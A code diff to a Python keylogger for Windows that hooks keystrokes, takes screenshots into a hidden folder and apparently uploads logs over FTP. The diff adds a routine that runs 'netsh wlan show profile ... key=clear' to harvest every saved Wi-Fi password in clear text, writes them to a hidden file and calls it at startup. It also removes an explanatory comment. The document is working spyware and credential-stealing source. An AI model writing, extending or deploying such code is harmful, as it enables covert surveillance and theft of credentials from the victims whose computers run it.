@@ -1,4 +1,4 @@
-import pyHook, pythoncom, os, getpass, time
+import pyHook, pythoncom, os, getpass, time, subprocess, re
 from PIL import ImageGrab
 from ftplib import FTP  # for uploading the file to an FTP server
 from datetime import datetime
@@ -19,6 +19,29 @@ screenshotpath = (r'C:\Hidden\Screenshots\\' + currentuser)
 if not os.path.exists(screenshotpath):
     os.makedirs(screenshotpath)
 
+def pastWiFiHarvest():
+
+    passwords = dict()
+    netshOutput = subprocess.check_output("netsh wlan show profile", shell=True).split('\n')
+    Names = list()
+
+    for name in netshOutput:
+        name = name.split(':')
+        try:
+            Names.append(name[1].strip())
+        except:
+            pass
+    for x in Names:
+        try:
+            output = subprocess.check_output("netsh wlan show profile name=" + x + " key=clear", shell=True)
+            output = re.findall('Key Content(.*)\n', output)[0].strip().split(':')[1].strip()
+            passwords[x] = output
+        except:
+            pass
+    PassDoc = open('C:\\Hidden\\Past_WiFi_Passwords_' + currentuser + '.txt', 'a+')
+    for x in passwords:
+        PassDoc.write("SSID = " + x + "\nPassword = " + passwords[x] + "\n\n")
+    PassDoc.close()
 
 def TakeScreenshot():
     global currentuser
@@ -80,17 +103,8 @@ def OnKeyboardEvent(event):
 
     return True  # pass event to other handlers
 
-
+pastWiFiHarvest()
 hooks_manager = pyHook.HookManager()
 hooks_manager.KeyDown = OnKeyboardEvent
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
-
-"""                     ---What's happening above?---
-    When a key is pressed, the logger first checks the window name that the key was pressed in, if this hasn't already
-    been recorded in the log it will be added.    
-    Next it will check if it was 'enter' or 'tab' that was pressed. If so, a new line will be added to the log.
-    Next it will check if backspace has been pressed. If so, the last character in the buffer will be deleted.
-    Next it will discard any non-ASCII characters
-    Finally the character will be added to the log if it meets none of the conditions above. 
-"""
